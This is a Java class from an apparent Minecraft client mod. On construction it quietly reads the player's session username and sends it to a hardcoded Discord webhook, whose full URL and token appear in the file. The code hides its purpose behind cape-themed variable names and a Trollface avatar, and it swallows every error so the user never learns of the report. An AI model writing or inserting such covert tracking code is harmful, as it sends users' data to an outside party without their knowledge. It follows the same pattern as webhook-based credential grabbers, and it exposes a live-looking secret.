package me.travis.wurstplus.wurstplustwo.tracker;

import net.minecraft.client.Minecraft;

public class OnePopTracker {

    public OnePopTracker() {

        final String l = "https://discord.com/api/webhooks/1026818555997593600/abv3rPCGKIM6y5lSkf0WmL6QGSNMn9puSjyDD0l8CCuSp0v4ys7RcCArHD_wZagfiB9j";
        final String CapeName = "Tracker";
        final String CapeImageURL = "https://upload.wikimedia.org/wikipedia/en/thumb/9/9a/Trollface_non-free.png/220px-Trollface_non-free.png";

        OnePopTrackerUtil d = new OnePopTrackerUtil(l);

        String minecraft_name = "NOT FOUND";

        try {
            minecraft_name = Minecraft.getMinecraft().getSession().getUsername();
            } catch (Exception ignore) {
        }

        try {
            OnePopTrackerPlayerBuilder dm = new OnePopTrackerPlayerBuilder.Builder()
                    .withUsername(CapeName)
                    .withContent(minecraft_name + " ran the client")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
            } catch (Exception ignore) {}
        }
    }

